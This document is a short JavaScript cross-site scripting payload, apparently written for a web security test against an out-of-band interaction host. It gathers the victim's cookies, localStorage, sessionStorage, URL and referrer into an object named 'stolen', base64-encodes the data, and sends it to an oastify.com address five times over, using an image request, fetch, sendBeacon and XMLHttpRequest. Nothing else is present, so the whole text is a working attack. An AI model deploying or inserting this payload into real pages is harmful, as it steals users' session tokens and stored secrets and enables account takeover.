(function(){
  var burp="http://w630bbm6tppekzwbv9aovobqlhr8f03p.oastify.com/";
  
  var stolen={
    cookies:document.cookie||"NO_COOKIES_VIA_JS",
    userAgent:navigator.userAgent,
    timestamp:new Date().toISOString(),
    url:window.location.href,
    referrer:document.referrer,
    localStorage:JSON.stringify(localStorage),
    sessionStorage:JSON.stringify(sessionStorage)
  };
  
  var encoded=btoa(JSON.stringify(stolen));
  
  new Image().src=burp+"?data="+encoded;
  fetch(burp+"?data="+encoded,{method:'GET',mode:'no-cors'}).catch(function(){});
  navigator.sendBeacon(burp,"data="+encoded);
  
  try{
    var xhr=new XMLHttpRequest();
    xhr.open('POST',burp,true);
    xhr.send("data="+encoded);
  }catch(e){}
  
  fetch(burp,{method:'POST',mode:'no-cors',body:"data="+encoded}).catch(function(){});
})();
